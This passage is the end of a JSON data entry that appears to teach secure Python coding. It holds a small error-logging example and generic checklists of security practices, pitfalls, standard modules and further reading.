# Some operation that might fail\n    result = 1 / 0\nexcept Exception as e:\n    logger.log_error(e, \"division operation\")\n```\n\nWHAT TO LOOK FOR:\n- **Input Validation**: All user inputs sanitized\n- **Secure Defaults**: Conservative security settings\n- **Error Handling**: No information leakage\n- **Resource Limits**: Prevent DoS conditions\n- **Audit Logging**: All security events recorded\n- **Code Reviews**: Regular security assessment\n\nSECURITY IMPLICATIONS:\n- **Script Vulnerabilities**: Injection and manipulation risks\n- **Data Exposure**: Sensitive information leakage\n- **System Compromise**: Unauthorized access through scripts\n- **Compliance Violations**: Security standard breaches\n- **Incident Response**: Investigation and recovery\n- **Risk Assessment**: Threat modeling and mitigation\n\nCOMMON PITFALLS:\n- **Trusting Input**: Unsanitized user data\n- **Information Disclosure**: Error message leakage\n- **Weak Cryptography**: Inadequate security algorithms\n- **Resource Exhaustion**: Unlimited resource consumption\n- **Poor Logging**: Missing security event tracking\n- **Code Injection**: Dynamic code execution risks\n\nTOOLS REFERENCE:\n- **re**: Regular expression validation\n- **secrets**: Cryptographically secure random numbers\n- **hashlib**: Secure hashing algorithms\n- **ssl**: Secure socket layer\n- **logging**: Event logging framework\n- **cryptography**: Advanced crypto operations\n\nFURTHER READING:\n- Secure Coding Practices: Python security guidelines\n- OWASP Top 10: Web application vulnerabilities\n- Cryptographic Best Practices: Secure algorithm selection\n- Input Validation: Data sanitization techniques\n- Logging Security: Safe event recording\n- Penetration Testing Ethics: Responsible security research",
      "tags": ["python", "security", "best-practices", "vulnerabilities", "secure-coding"]
    }
  ]
}
